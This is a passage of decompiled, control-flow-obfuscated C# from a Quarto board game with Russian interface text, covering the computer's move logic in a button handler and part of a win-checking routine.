					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num6 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num12, num10]), num7 * size + 4, num6 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1611866651) ^ -2006373623;
					continue;
				case 7u:
					Paint_Board();
					num = ((int)num2 * -850908299) ^ 0x1CD6CD21;
					continue;
				case 6u:
				{
					int num8;
					int num9;
					if (flag2)
					{
						num8 = -1135195125;
						num9 = -1135195125;
					}
					else
					{
						num8 = -1650649844;
						num9 = -1650649844;
					}
					num = num8 ^ ((int)num2 * -1985709931);
					continue;
				}
				case 4u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = ((int)num2 * -1713751025) ^ -1696382512;
					continue;
				case 3u:
					num = (int)(num2 * 395002702) ^ -462135277;
					continue;
				case 2u:
					num = (int)((num2 * 179269848) ^ 0x47BF52B0);
					continue;
				case 1u:
					num = (int)((num2 * 1882930064) ^ 0xF01F611);
					continue;
				case 0u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 265559289;
						num4 = 265559289;
					}
					else
					{
						num3 = 1610639649;
						num4 = 1610639649;
					}
					num = num3 ^ (int)(num2 * 732083730);
					continue;
				}
				default:
					return;
				case 28u:
					break;
				case 5u:
					return;
					IL_00f7:
					flag = (byte)num5 != 0;
					num = 1723896782;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_075f: Unknown result type (might be due to invalid IL or missing references)
		//IL_078d: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		bool flag = Form1.smethod_46((Control)(object)pictureBox1);
		bool flag11 = default(bool);
		int num13 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		Figurine[,] array2 = default(Figurine[,]);
		int num18 = default(int);
		bool flag10 = default(bool);
		int num4 = default(int);
		int num21 = default(int);
		int num31 = default(int);
		int num23 = default(int);
		int num36 = default(int);
		int num22 = default(int);
		bool flag14 = default(bool);
		bool flag15 = default(bool);
		Graphics graphics_ = default(Graphics);
		int num3 = default(int);
		int num19 = default(int);
		int num20 = default(int);
		bool flag16 = default(bool);
		bool flag12 = default(bool);
		int num45 = default(int);
		int num52 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		int num14 = default(int);
		bool flag5 = default(bool);
		int num10 = default(int);
		int num9 = default(int);
		bool flag3 = default(bool);
		int num16 = default(int);
		int num17 = default(int);
		bool flag6 = default(bool);
		int num32 = default(int);
		bool flag8 = default(bool);
		bool flag9 = default(bool);
		bool flag4 = default(bool);
		bool flag13 = default(bool);
		bool flag2 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		bool flag7 = default(bool);
		while (true)
		{
			int num = -502372482;
			while (true)
			{
				uint num2;
				int num63;
				int num30;
				int num33;
				int num42;
				switch ((num2 = (uint)num ^ 0xD65A567Eu) % 181u)
				{
				case 180u:
					flag11 = num13 < 4;
					num = -1606914922;
					continue;
				case 179u:
					if (storage[num5, num6] != null)
					{
						num = (int)((num2 * 55842940) ^ 0x69576FBC);
						continue;
					}
					goto IL_0055;
				case 178u:
					num = ((int)num2 * -1786959613) ^ -519672023;
					continue;
				case 177u:
					Form1.smethod_15(timer1);
					num = (int)(num2 * 18324861) ^ -2141426516;
					continue;
				case 176u:
					Form1.smethod_15(timer1);
					num = -828132093;
					continue;
				case 175u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -2008563238) ^ -485287513;
					continue;
				case 174u:
					num18 = 0;
					num = -1381584438;
					continue;
				case 173u:
				{
					int num38;
					int num39;
					if (flag10)
					{
						num38 = 1136429039;
						num39 = 1136429039;
					}
					else
					{
						num38 = 731075766;
						num39 = 731075766;
					}
					num = num38 ^ ((int)num2 * -454055138);
					continue;
				}
				case 172u:
					if (num6 == num4)
					{
						goto IL_0055;
					}
					goto IL_0061;
				case 171u:
					Form1.smethod_5((Control)(object)borderBox[num21, num18], Color.LimeGreen);
					num = ((int)num2 * -1187476072) ^ -1956338056;
					continue;
				case 170u:
					Form1.smethod_30((Control)(object)borderBox[num31, num23]);
					Form1.smethod_20(pictureBox[num31, num23], (Image)null);
					num = (int)(num2 * 930760362) ^ -992245243;
					continue;
				case 169u:
					Form1.smethod_7((Control)(object)pictureBox[num36, num22], bool_0: true);
					num = -1940599845;
					continue;
				case 168u:
					flag14 = num22 < 4;
					num = -1415684897;
					continue;
				case 167u:
					flag15 = Form1.smethod_41((Control)(object)borderBox[num21, num18]) == Color.Red;
					num = (int)((num2 * 793570331) ^ 0x47FBE37E);
					continue;
				case 166u:
					if (!Standoff(board))
					{
						num = -220558953;
						num63 = -220558953;
						continue;
					}
					goto IL_0205;
				case 165u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num19 * size + 4, num20 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 234680033) ^ 0x5006E0E2);
					continue;
				case 164u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -329011052) ^ 0x8ACC49F;
					continue;
				case 163u:
					flag16 = num31 < 4;
					num = -791911808;
					continue;
				case 162u:
					num = (int)(num2 * 415765357) ^ -294380988;
					continue;
				case 161u:
				{
					int num55;
					int num56;
					if (!flag12)
					{
						num55 = 88317097;
						num56 = 88317097;
					}
					else
					{
						num55 = 131159453;
						num56 = 131159453;
					}
					num = num55 ^ ((int)num2 * -951016048);
					continue;
				}
				case 160u:
					num = ((int)num2 * -1197586365) ^ -1000874095;
					continue;
				case 159u:
					num45 = num31;
					num = (int)(num2 * 1223893565) ^ -17818047;
					continue;
				case 158u:
					num52++;
					num = ((int)num2 * -228178580) ^ 0x2132528C;
					continue;
				case 157u:
					num5 = Form1.smethod_33(rnd, 4);
					num6 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1098294005) ^ -286967977;
					continue;
				case 156u:
					num = (int)(num2 * 167936544) ^ -1521202080;
					continue;
				case 155u:
				{
					int num46;
					int num47;
					if (flag15)
					{
						num46 = 1507733683;
						num47 = 1507733683;
					}
					else
					{
						num46 = 1806847928;
						num47 = 1806847928;
					}
					num = num46 ^ (int)(num2 * 995860839);
					continue;
				}
				case 154u:
					num45 = 0;
					num = (int)(num2 * 910775259) ^ -326768791;
					continue;
				case 153u:
					flag10 = array3[num13, num14] == null;
					num = -50454128;
					continue;
				case 152u:
					num = (int)(num2 * 1705962370) ^ -610746823;
					continue;
				case 151u:
					flag5 = true;
					num = ((int)num2 * -139548342) ^ 0x57CD8DD;
					continue;
				case 150u:
					board[num10, num9] = new Figurine(storage[num3, num4]);
					num = (int)(num2 * 1353458691) ^ -1953767566;
					continue;
				case 149u:
				{
					int num34;
					int num35;
					if (!flag3)
					{
						num34 = -741885603;
						num35 = -741885603;
					}
					else
					{
						num34 = -2118970580;
						num35 = -2118970580;
					}
					num = num34 ^ ((int)num2 * -1563434356);
					continue;
				}
				case 148u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1636389181) ^ 0x52F4D9F7);
					continue;
				case 147u:
					num = (int)((num2 * 1161153781) ^ 0x19DA87B2);
					continue;
				case 146u:
					if (!Stop(array2))
					{
						num = ((int)num2 * -1321725511) ^ 0x1DF8AC22;
						continue;
					}
					goto IL_04b5;
				case 145u:
					Form1.smethod_47(200);
					num = (int)((num2 * 1675889598) ^ 0x7565158D);
					continue;
				case 144u:
					storage[num16, num17] = null;
					num = (int)(num2 * 1213069977) ^ -342729470;
					continue;
				case 143u:
					num = (int)(num2 * 1538193127) ^ -324101930;
					continue;
				case 142u:
					num22 = 0;
					num = -814729411;
					continue;
				case 141u:
					num = (int)(num2 * 618869138) ^ -1361528738;
					continue;
				case 140u:
					num18++;
					num = (int)((num2 * 869504561) ^ 0x78CBDFEF);
					continue;
				case 139u:
					num16 = 0;
					num17 = 0;
					num = ((int)num2 * -1206465298) ^ -1494865291;
					continue;
				case 138u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = (int)((num2 * 1965645320) ^ 0xFD42649);
					continue;
				case 137u:
					num = (int)(num2 * 785304800) ^ -923563732;
					continue;
				case 136u:
					num = ((int)num2 * -1012934769) ^ -1046874124;
					continue;
				case 135u:
					num = (int)((num2 * 1910471586) ^ 0xF6B59ED);
					continue;
				case 134u:
					num = ((int)num2 * -489150683) ^ 0x5DA82F7D;
					continue;
				case 133u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num9 + 0.05f) * (float)size, ((float)num10 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num9 * size + 4, num10 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = ((int)num2 * -1128510608) ^ -1367854697;
					continue;
				case 132u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = (int)(num2 * 304453001) ^ -1727743690;
					continue;
				case 131u:
					num17 = num23;
					num = (int)((num2 * 1276995989) ^ 0xC5F7961);
					continue;
				case 130u:
					flag6 = Standoff(board);
					num = -564386838;
					continue;
				case 129u:
					Paint_Board();
					if (!Stop(board))
					{
						num = (int)((num2 * 2108516689) ^ 0x5577B84F);
						continue;
					}
					goto IL_0205;
				case 128u:
					num52 = 0;
					num = ((int)num2 * -1684040042) ^ 0x499515CC;
					continue;
				case 127u:
					board[num45, num32] = new Figurine(storage[num16, num17]);
					num = (int)((num2 * 2140000396) ^ 0x7EB62B5C);
					continue;
				case 126u:
				{
					int num65;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num23 * size + size / 2, (int)(((float)num31 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = -1464386563;
						num65 = -1464386563;
					}
					else
					{
						num = -1946061756;
						num65 = -1946061756;
					}
					continue;
				}
				case 125u:
					if (!Standoff(array2))
					{
						num = -1140282195;
						num30 = -1140282195;
						continue;
					}
					goto IL_04b5;
				case 124u:
				{
					int num64;
					if (board[num10, num9] != null)
					{
						num = -1817356552;
						num64 = -1817356552;
					}
					else
					{
						num = -168356909;
						num64 = -168356909;
					}
					continue;
				}
				case 123u:
					num = ((int)num2 * -1986718481) ^ 0x8DF78CB;
					continue;
				case 122u:
					num = ((int)num2 * -775454407) ^ 0x652741EC;
					continue;
				case 121u:
					num31++;
					num = (int)(num2 * 1159147139) ^ -1439763720;
					continue;
				case 120u:
					num = ((int)num2 * -514689070) ^ -55745930;
					continue;
				case 119u:
				{
					int num61;
					int num62;
					if (!Standoff(board))
					{
						num61 = 894502159;
						num62 = 894502159;
					}
					else
					{
						num61 = 1498926336;
						num62 = 1498926336;
					}
					num = num61 ^ ((int)num2 * -1813045949);
					continue;
				}
				case 118u:
					Form1.smethod_30((Control)(object)label2);
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 1040581440) ^ -231975410;
					continue;
				case 117u:
					num = -954646834;
					continue;
				case 116u:
					num = -519613614;
					continue;
				case 115u:
					flag8 = Form1.smethod_41((Control)(object)borderBox[num31, num23]) == Color.Blue;
					num = -1779831250;
					continue;
				case 114u:
					num = (int)(num2 * 761622312) ^ -1508744050;
					continue;
				case 113u:
					num = -1221440041;
					continue;
				case 112u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = (int)(num2 * 1533819907) ^ -464948585;
					continue;
				case 110u:
					num32 = num23;
					num = ((int)num2 * -218154915) ^ 0x22F1F8B;
					continue;
				case 109u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = (int)((num2 * 442668249) ^ 0x7E6CBAC8);
					continue;
				case 108u:
					num10++;
					num = ((int)num2 * -1790393229) ^ -1400165020;
					continue;
				case 107u:
					num16 = num31;
					num = (int)(num2 * 1654530391) ^ -878356105;
					continue;
				case 106u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -1161696015) ^ 0x30E9F0F5;
					continue;
				case 105u:
					num3 = num21;
					num = (int)(num2 * 1360496995) ^ -1419732777;
					continue;
				case 104u:
					num4 = num18;
					num = (int)((num2 * 118021139) ^ 0x27F5AFEF);
					continue;
				case 103u:
					num14++;
					num = -1552207623;
					continue;
				case 102u:
					step++;
					num = (int)(num2 * 823209943) ^ -387151266;
					continue;
				case 101u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)(num2 * 1413036818) ^ -613673865;
					continue;
				case 100u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -421470879) ^ -463397228;
					continue;
				case 99u:
					num = ((int)num2 * -329536796) ^ 0x3FA4B5F3;
					continue;
				case 98u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = ((int)num2 * -1602400262) ^ -806853959;
					continue;
				case 97u:
					num = (int)((num2 * 493727103) ^ 0x60FF4F26);
					continue;
				case 96u:
					num3 = 0;
					num4 = 0;
					num = ((int)num2 * -503225174) ^ 0x369E549A;
					continue;
				case 95u:
					num = (int)(num2 * 1602680085) ^ -1808185604;
					continue;
				case 94u:
					num = ((int)num2 * -1179784289) ^ -462197954;
					continue;
				case 93u:
					num = (int)(num2 * 1632866100) ^ -1762927857;
					continue;
				case 92u:
					num = ((int)num2 * -64145788) ^ 0x2FF013DE;
					continue;
				case 91u:
					num20 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 56893770) ^ -1354845650;
					continue;
				case 90u:
					num = (int)((num2 * 1782448014) ^ 0x2369B9E6);
					continue;
				case 89u:
					Form1.smethod_47(1000);
					num = ((int)num2 * -1894506267) ^ 0x705A17D6;
					continue;
				case 88u:
					num = -857212175;
					continue;
				case 87u:
					num9 = 0;
					num = -943785731;
					continue;
				case 86u:
					num19 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -552537713) ^ 0x384CAE68;
					continue;
				case 85u:
					num = (int)((num2 * 455980562) ^ 0x60C94ECB);
					continue;
				case 84u:
					num = -720310487;
					continue;
				case 83u:
				{
					int num59;
					int num60;
					if (flag)
					{
						num59 = 622580145;
						num60 = 622580145;
					}
					else
					{
						num59 = 2004165944;
						num60 = 2004165944;
					}
					num = num59 ^ (int)(num2 * 1081148514);
					continue;
				}
				case 82u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -398839072) ^ 0x31A2DD25;
					continue;
				case 81u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1051537634;
					continue;
				case 80u:
				{
					int num57;
					int num58;
					if (flag9)
					{
						num57 = 1512125013;
						num58 = 1512125013;
					}
					else
					{
						num57 = 1633092199;
						num58 = 1633092199;
					}
					num = num57 ^ ((int)num2 * -1221339918);
					continue;
				}
				case 79u:
					num23 = 0;
					num = -500264548;
					continue;
				case 78u:
					num36 = 0;
					num = ((int)num2 * -1141207552) ^ -1985438344;
					continue;
				case 77u:
				{
					int num53;
					int num54;
					if (!flag11)
					{
						num53 = 1260939850;
						num54 = 1260939850;
					}
					else
					{
						num53 = 650926;
						num54 = 650926;
					}
					num = num53 ^ (int)(num2 * 94390669);
					continue;
				}
				case 76u:
					array2[num10, num9] = new Figurine(storage[num3, num4]);
					num = (int)((num2 * 89625441) ^ 0x6F2F0678);
					continue;
				case 75u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = ((int)num2 * -1447566968) ^ 0x7E5B3324;
					continue;
				case 74u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -2104022893) ^ -1273510879;
					continue;
				case 73u:
					num31 = 0;
					num = (int)(num2 * 445355186) ^ -242123076;
					continue;
				case 72u:
					flag4 = num18 < 4;
					num = -866746017;
					continue;
				case 71u:
					step++;
					num = -700367486;
					continue;
				case 70u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -361801290) ^ -1303581491;
					continue;
				case 69u:
					Form1.smethod_30((Control)(object)pictureBox[num31, num23]);
					num = ((int)num2 * -569593313) ^ -1113518822;
					continue;
				case 68u:
					num33 = ((num52 < 9) ? 1 : 0);
					goto IL_0dbc;
				case 67u:
					num = (int)((num2 * 403907593) ^ 0x3A8D427C);
					continue;
				case 66u:
				{
					int num50;
					int num51;
					if (board[num20, num19] != null)
					{
						num50 = 2131863302;
						num51 = 2131863302;
					}
					else
					{
						num50 = 804176089;
						num51 = 804176089;
					}
					num = num50 ^ ((int)num2 * -390159849);
					continue;
				}
				case 65u:
				{
					int num48;
					int num49;
					if (flag16)
					{
						num48 = -611753911;
						num49 = -611753911;
					}
					else
					{
						num48 = -1270970381;
						num49 = -1270970381;
					}
					num = num48 ^ (int)(num2 * 235528619);
					continue;
				}
				case 64u:
					if (num5 == num3)
					{
						num = (int)((num2 * 1461170766) ^ 0x2A6D6246);
						continue;
					}
					goto IL_0061;
				case 63u:
					Form1.smethod_30((Control)(object)borderBox[num21, num18]);
					num = (int)(num2 * 1923654717) ^ -2047861869;
					continue;
				case 61u:
					flag13 = num23 < 4;
					num = -1125628137;
					continue;
				case 60u:
				{
					int num43;
					int num44;
					if (!flag14)
					{
						num43 = -159246968;
						num44 = -159246968;
					}
					else
					{
						num43 = -2126916555;
						num44 = -2126916555;
					}
					num = num43 ^ (int)(num2 * 2099096525);
					continue;
				}
				case 59u:
					Form1.smethod_47(200);
					num = (int)(num2 * 2021978689) ^ -216976678;
					continue;
				case 58u:
					num36++;
					num = (int)(num2 * 186732184) ^ -1075299984;
					continue;
				case 57u:
					num = (int)((num2 * 1920407726) ^ 0x23CB5583);
					continue;
				case 56u:
				{
					int num40;
					int num41;
					if (!flag13)
					{
						num40 = -1967491998;
						num41 = -1967491998;
					}
					else
					{
						num40 = -1236950689;
						num41 = -1236950689;
					}
					num = num40 ^ ((int)num2 * -1809455477);
					continue;
				}
				case 55u:
					num = ((int)num2 * -580382107) ^ -283149600;
					continue;
				case 54u:
					num = ((int)num2 * -167176556) ^ -1592957430;
					continue;
				case 53u:
					flag2 = num14 < 4;
					num = -1423855704;
					continue;
				case 52u:
					flag12 = num10 < 4;
					num = -831140157;
					continue;
				case 51u:
					storage[num3, num4] = null;
					num = (int)(num2 * 1059423790) ^ -1396396730;
					continue;
				case 50u:
				{
					int num37;
					if (num21 >= 4)
					{
						num = -1926689119;
						num37 = -1926689119;
					}
					else
					{
						num = -1920885165;
						num37 = -1920885165;
					}
					continue;
				}
				case 49u:
					flag9 = num36 < 4;
					num = -1013889385;
					continue;
				case 48u:
					Form1.smethod_7((Control)(object)pictureBox[num21, num18], bool_0: false);
					num = ((int)num2 * -1926049683) ^ -1278046923;
					continue;
				case 47u:
					num = (int)(num2 * 1442836930) ^ -1662250571;
					continue;
				case 46u:
					if (!flag5)
					{
						num = ((int)num2 * -22444752) ^ 0x47244907;
						continue;
					}
					num33 = 1;
					goto IL_0dbc;
				case 45u:
					num32 = 0;
					num = ((int)num2 * -1955232632) ^ -1097678619;
					continue;
				case 44u:
					num = ((int)num2 * -661076524) ^ -1606861466;
					continue;
				case 43u:
					(menu as Form3).ContinueLock();
					num = (int)((num2 * 177533777) ^ 0x379F0B85);
					continue;
				case 42u:
					array = (Figurine[,])Form1.smethod_48((Array)array3);
					num = (int)((num2 * 701973899) ^ 0xA71A4AA);
					continue;
				case 41u:
					num = ((int)num2 * -2070648924) ^ -920350946;
					continue;
				case 40u:
					num21 = 0;
					num = (int)(num2 * 2114056591) ^ -2006803791;
					continue;
				case 39u:
					board[num20, num19] = new Figurine(storage[num3, num4]);
					num = ((int)num2 * -526064337) ^ 0x3FDF9090;
					continue;
				case 38u:
					Form1.smethod_5((Control)(object)borderBox[num31, num23], Color.White);
					num = ((int)num2 * -988766583) ^ 0x6A6971A9;
					continue;
				case 37u:
				{
					int num28;
					int num29;
					if (!flag8)
					{
						num28 = -1275642487;
						num29 = -1275642487;
					}
					else
					{
						num28 = -1096812195;
						num29 = -1096812195;
					}
					num = num28 ^ (int)(num2 * 315287739);
					continue;
				}
				case 36u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					array3[num20, num19] = new Figurine(storage[num3, num4]);
					num13 = 0;
					num = (int)((num2 * 1751932948) ^ 0x1D19CB36);
					continue;
				case 35u:
				{
					int num26;
					int num27;
					if (!flag7)
					{
						num26 = -793663735;
						num27 = -793663735;
					}
					else
					{
						num26 = -1721631922;
						num27 = -1721631922;
					}
					num = num26 ^ ((int)num2 * -17784408);
					continue;
				}
				case 34u:
					num = ((int)num2 * -1981244620) ^ -146028293;
					continue;
				case 33u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -86306717) ^ -2050065350;
					continue;
				case 32u:
					num = -1988117698;
					continue;
				case 31u:
				{
					int num24;
					int num25;
					if (flag6)
					{
						num24 = -1456545185;
						num25 = -1456545185;
					}
					else
					{
						num24 = -1111566384;
						num25 = -1111566384;
					}
					num = num24 ^ (int)(num2 * 1686157312);
					continue;
				}
				case 30u:
					num = ((int)num2 * -1405976484) ^ -762415630;
					continue;
				case 29u:
					num23++;
					num = -500264548;
					continue;
				case 28u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)(num2 * 818646464) ^ -1952577699;
					continue;
				case 27u:
					num22++;
					num = (int)((num2 * 1678650144) ^ 0x2B9B309F);
					continue;
				case 26u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = (int)((num2 * 253491777) ^ 0x56B0DAA4);
					continue;
				case 25u:
					num10 = 0;
					num = ((int)num2 * -953719809) ^ 0x416B4549;
					continue;
				case 24u:
					num21++;
					num = (int)((num2 * 470848380) ^ 0x2995299D);
					continue;
				case 23u:
					num = (int)(num2 * 888357774) ^ -1171464855;
					continue;
				case 22u:
					num9++;
					num = -943785731;
					continue;
				case 21u:
					num = (int)((num2 * 768314545) ^ 0x69EB464D);
					continue;
				case 20u:
					flag5 = false;
					num = (int)((num2 * 1996564960) ^ 0x3BB37000);
					continue;
				case 19u:
					num14 = 0;
					num = -1545988645;
					continue;
				case 18u:
					num = -650356472;
					continue;
				case 17u:
					num = ((int)num2 * -1307638105) ^ 0x25C77292;
					continue;
				case 16u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num19 + 0.05f) * (float)size, ((float)num20 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -787644850) ^ 0x7B695D2F;
					continue;
				case 15u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -1543809565) ^ -705742100;
					continue;
				case 14u:
				{
					int num15;
					if (num9 >= 4)
					{
						num = -2082555900;
						num15 = -2082555900;
					}
					else
					{
						num = -2015871689;
						num15 = -2015871689;
					}
					continue;
				}
				case 13u:
					array[num13, num14] = new Figurine(storage[num5, num6]);
					num = ((int)num2 * -1329214654) ^ -1358292601;
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1841950115) ^ 0x99780DC);
					continue;
				case 11u:
					num = ((int)num2 * -1523517163) ^ 0x67852D4;
					continue;
				case 10u:
					num = ((int)num2 * -243371713) ^ -1231239062;
					continue;
				case 9u:
					num = -1809307300;
					continue;
				case 8u:
					num = ((int)num2 * -1059635362) ^ 0x41A1FFFC;
					continue;
				case 7u:
					num = ((int)num2 * -1158183490) ^ -1588652813;
					continue;
				case 6u:
					num13++;
					num = (int)(num2 * 1932759883) ^ -410177777;
					continue;
				case 5u:
				{
					int num11;
					int num12;
					if (!flag4)
					{
						num11 = -698843287;
						num12 = -698843287;
					}
					else
					{
						num11 = -168074501;
						num12 = -168074501;
					}
					num = num11 ^ (int)(num2 * 1872116747);
					continue;
				}
				case 4u:
					flag3 = Stop(array);
					num = ((int)num2 * -866716802) ^ 0x7B13FD9;
					continue;
				case 3u:
					num = -1817356552;
					continue;
				case 2u:
				{
					int num7;
					int num8;
					if (!flag2)
					{
						num7 = -2147227247;
						num8 = -2147227247;
					}
					else
					{
						num7 = -861781288;
						num8 = -861781288;
					}
					num = num7 ^ ((int)num2 * -1496758940);
					continue;
				}
				case 1u:
					storage[num3, num4] = null;
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.Blue);
					num = (int)(num2 * 1328030962) ^ -114888177;
					continue;
				case 0u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -1104827911) ^ -1590723996;
					continue;
				default:
					return;
				case 111u:
					break;
				case 62u:
					return;
					IL_04b5:
					num = -2141325278;
					num30 = -2141325278;
					continue;
					IL_0061:
					num = -336154981;
					num42 = -336154981;
					continue;
					IL_0055:
					num = -1549696097;
					num42 = -1549696097;
					continue;
					IL_0dbc:
					flag7 = (byte)num33 != 0;
					num = -1958984775;
					continue;
					IL_0205:
					num = -767795777;
					num63 = -767795777;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num3 = default(int);
		bool flag2 = default(bool);
		bool flag = default(bool);
		bool flag3 = default(bool);
		bool result = default(bool);
		while (true)
		{
			int num = 1335131942;
			while (true)
			{
				uint num2;
				int num24;
				int num17;
				switch ((num2 = (uint)num ^ 0x681D86Du) % 78u)
				{
				case 77u:
				{
					int num63;
					if (mem[0, num3].Point != mem[1, num3].Point)
					{
						num = 458876648;
						num63 = 458876648;
					}
					else
					{
						num = 292727781;
						num63 = 292727781;
					}
					continue;
				}
				case 76u:
					if (mem[3, 0] != null)
					{
						num = ((int)num2 * -2002523112) ^ -2092663238;
						continue;
					}
					goto IL_005b;
				case 75u:
					if (mem[3, num3] != null)
					{
						num = (int)(num2 * 1444103780) ^ -716825051;
						continue;
					}
					goto IL_0085;
				case 74u:
					num = 1664781871;
					continue;
				case 73u:
					num3 = 0;
					num = (int)(num2 * 937423984) ^ -695926867;
					continue;
				case 72u:
					num24 = ((mem[2, 1].Square == mem[3, 0].Square) ? 1 : 0);
					goto IL_005c;
				case 71u:
				{
					int num45;
					int num46;
					if (mem[3, 3] == null)
					{
						num45 = 1664362333;
						num46 = 1664362333;
					}
					else
					{
						num45 = 1036622110;
						num46 = 1036622110;
					}
					num = num45 ^ (int)(num2 * 72711915);
					continue;
				}
				case 70u:
					if (mem[1, num3] != null)
					{
						num = ((int)num2 * -604435185) ^ -1421395281;
						continue;
					}
					goto IL_0085;
				case 69u:
				{
					int num18;
					int num19;
					if (flag2)
					{
						num18 = 1135252858;
						num19 = 1135252858;
					}
					else
					{
						num18 = 1385104401;
						num19 = 1385104401;
					}
					num = num18 ^ (int)(num2 * 8643747);
					continue;
				}
				case 68u:
				{
					int num4;
					int num5;
					if (mem[1, 1] != null)
					{
						num4 = 1969230140;
						num5 = 1969230140;
					}
					else
					{
						num4 = 2008062250;
						num5 = 2008062250;
					}
					num = num4 ^ ((int)num2 * -172705261);
					continue;
				}
				case 67u:
				{
					int num53;
					int num54;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num53 = 1163158486;
						num54 = 1163158486;
					}
					else
					{
						num53 = 1217978451;
						num54 = 1217978451;
					}
					num = num53 ^ (int)(num2 * 40649530);
					continue;
				}
				case 66u:
				{
					int num38;
					int num39;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num38 = -1259249194;
						num39 = -1259249194;
					}
					else
					{
						num38 = -1764704642;
						num39 = -1764704642;
					}
					num = num38 ^ ((int)num2 * -1784267280);
					continue;
				}
				case 65u:
				{
					int num34;
					if (mem[0, 0].Dark != mem[1, 1].Dark)
					{
						num = 1732027579;
						num34 = 1732027579;
					}
					else
					{
						num = 1773052088;
						num34 = 1773052088;
					}
					continue;
				}
				case 64u:
				{
					int num10;
					int num11;
					if (mem[1, num3].Point == mem[2, num3].Point)
					{
						num10 = 205770065;
						num11 = 205770065;
					}
					else
					{
						num10 = 1999384536;
						num11 = 1999384536;
					}
					num = num10 ^ (int)(num2 * 1045990022);
					continue;
				}
				case 63u:
					flag = false;
					num = ((int)num2 * -2008818457) ^ 0x42B50E2F;
					continue;
				case 62u:
				{
					int num66;
					int num67;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num66 = -1874662599;
						num67 = -1874662599;
					}
					else
					{
						num66 = -147130282;
						num67 = -147130282;
					}
					num = num66 ^ (int)(num2 * 680398240);
					continue;
				}
				case 61u:
				{
					int num57;
					int num58;
					if (mem[num3, 3] != null)
					{
						num57 = -1208804341;
						num58 = -1208804341;
					}
					else
					{
						num57 = -690661892;
						num58 = -690661892;
					}
					num = num57 ^ ((int)num2 * -1686113035);
					continue;
				}
				case 60u:
					if (mem[1, num3].Square == mem[2, num3].Square)
					{
						num = (int)((num2 * 198973070) ^ 0x5B83ADCE);
						continue;
					}
					goto IL_0323;
				case 59u:
				{
					int num40;
					int num41;
					if (mem[1, num3].Big != mem[2, num3].Big)
					{
						num40 = 650782422;
						num41 = 650782422;
					}
					else
					{
						num40 = 62077304;
						num41 = 62077304;
					}
					num = num40 ^ ((int)num2 * -464398946);
					continue;
				}
				case 58u:
					if (mem[2, num3] != null)
					{
						num = (int)((num2 * 1803594643) ^ 0x1EF8D8FE);
						continue;
					}
					goto IL_0085;
				case 57u:
				{
					int num32;
					int num33;
